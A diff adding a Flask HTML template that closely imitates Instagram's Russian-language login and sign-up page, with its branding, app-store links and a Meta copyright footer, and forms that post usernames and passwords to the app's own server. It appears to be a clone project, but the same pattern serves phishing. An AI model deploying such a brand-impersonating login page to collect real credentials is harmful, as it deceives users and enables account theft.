@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/static/style/style.css">
+    <link rel="icon" href="/static/img/web_img/rel_icon_instagram.png">
+</head>
+<body style="display: block; background: #fff;">
+<section class="login">
+    <div class="login_img">
+        <img src="/static/img/web_img/login_phone.png" alt="">
+    </div>
+    <div class="login_info">
+        <div class="login_box">
+            <img src="/static/img/web_img/Instagram_logo.png" alt="" class="instagram">
+            {% if error %}
+                <p style="color: red" class="error">{{ error }}</p>
+            {% endif %}
+            <form action="{{ url_for('login') }}" method="post">
+                <input name="username" type="text" placeholder="Телефон, имя пользователя или эл. адрес">
+                <input name="password" type="password" placeholder="Пароль">
+                <button class="login_btn" name="login" value="True">Войти</button>
+            </form>
+            <div class="or_register">
+                или
+            </div>
+            <div class="facebook_login">
+                <img src="/static/img/web_img/facebook_login.png" alt="">
+                Войти через <a href="#">Facebook</a>
+            </div>
+            <a href="#">Забыли пароль?</a>
+        </div>
+        <div class="login_box log_reg">
+            У вас ещё нет аккаунта? <span class="register_js" style="cursor: pointer;">Зарегистрироваться</span>
+        </div>
+        <div class="app_box">
+            Установите приложение.
+            <div class="app_box_img">
+                <a href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dutm_source%253Dinstagramweb%2526utm_campaign%253DloginPage%2526ig_mid%253D20C8976E-ADB5-4125-B792-3F9645AC991B%2526utm_content%253Dlo%2526utm_medium%253Dbadge&e=AT0XHQggCn6mMzP83hA__JbpJSHFJreEgdWeqgSfHffvF-aAQUgqSLk4iP6mBeiMj6TrGYmz9fq0IkSkAEjW961gUStgSAFJ4ZbOjskRP74BM4nYm25j3EEMRw6QlnobQKrn8T4YNncIF3_bXXk2Pg"><img
+                        src="/static/img/web_img/login_google_play.png" alt="Google Play"></a>
+                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1366%2C728"><img
+                        src="/static/img/web_img/login_micrasoft.png" alt="Microsoft"></a>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="registration">
+    <div class="login_box">
+        <img src="/static/img/web_img/Instagram_logo.png" alt="" class="instagram"
+             style="margin-bottom: 20px;margin-top: 20px;">
+        <div class="login_info_text">
+            Зарегистрируйтесь, чтобы
+            смотреть фото и видео ваших
+            друзей.
+        </div>
+        <a href="#" class="login_btn" style="color: #fff;"><img src="/static/img/web_img/facebook_login_white.png"
+                                                                alt="Facebook">Войти через Facebook</a>
+        <div class="or_register">
+            или
+        </div>
+        {% if error %}
+            <p style="color: red" class="error">{{ error }}</p>
+        {% endif %}
+        <form action="{{ url_for('login') }}" method="post">
+            <input type="text" name="phone_email" placeholder="Моб. телефон или эл. адрес">
+            <input type="text" name="name" placeholder="Имя и фамилия">
+            <input type="text" name="username" placeholder="Имя пользователя">
+            <input type="password" name="password" placeholder="Пароль">
+            <p style="margin-bottom: 0;">Люди, которые пользуются нашим сервисом, <br>
+                могли загрузить вашу контактную информацию <br>
+                в Instagram. <a href="#">Подробнее</a></p>
+            <p style="margin-top: 16px;">Регистрируясь, вы принимаете наши <a href="#">Условия,<br> Политику
+                конфиденциальности</a> и <a href="#">Политику в
+                <br> отношении файлов cookie.</a></p>
+            <button class="register_btn" name="reg" value="True">
+                Регистрация
+            </button>
+        </form>
+    </div>
+    <div class="login_box">
+        <p>Есть аккаунт? <a href="#" class="login_js">Вход</a></p>
+    </div>
+    <div class="app_box">
+        Установите приложение.
+        <div class="app_box_img">
+            <a href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dutm_source%253Dinstagramweb%2526utm_campaign%253DloginPage%2526ig_mid%253D20C8976E-ADB5-4125-B792-3F9645AC991B%2526utm_content%253Dlo%2526utm_medium%253Dbadge&e=AT0XHQggCn6mMzP83hA__JbpJSHFJreEgdWeqgSfHffvF-aAQUgqSLk4iP6mBeiMj6TrGYmz9fq0IkSkAEjW961gUStgSAFJ4ZbOjskRP74BM4nYm25j3EEMRw6QlnobQKrn8T4YNncIF3_bXXk2Pg"><img
+                    src="/static/img/web_img/login_google_play.png" alt="Google Play"></a>
+            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1366%2C728"><img
+                    src="/static/img/web_img/login_micrasoft.png" alt="Microsoft"></a>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="footer_row">
+        <a href="#">Meta</a><a href="#">Информация</a><a href="#">Блог</a><a href="#">Вакансии</a><a href="#">Помощь</a>
+        <a href="#">API</a><a href="#">Конфиденциальность</a><a href="#">Условия</a><a href="#">Популярные аккаунты</a>
+        <a href="#">Места</a><a href="#">Instagram Lite</a><a href="#">Загрузка контактов и лица, не являющиеся
+        пользователями</a><a href="#">Meta Verified</a>
+    </div>
+    <div class="footer_row">
+        <a href="#">Русский <i class="fa-solid fa-angle-down"></i></a><a href="#">© 2023 Instagram from Meta</a>
+    </div>
+</footer>
+
+<script src="https://kit.fontawesome.com/d17442df75.js" crossorigin="anonymous"></script>
+<script src="/static/js/script.js"></script>
+</body>
+</html>
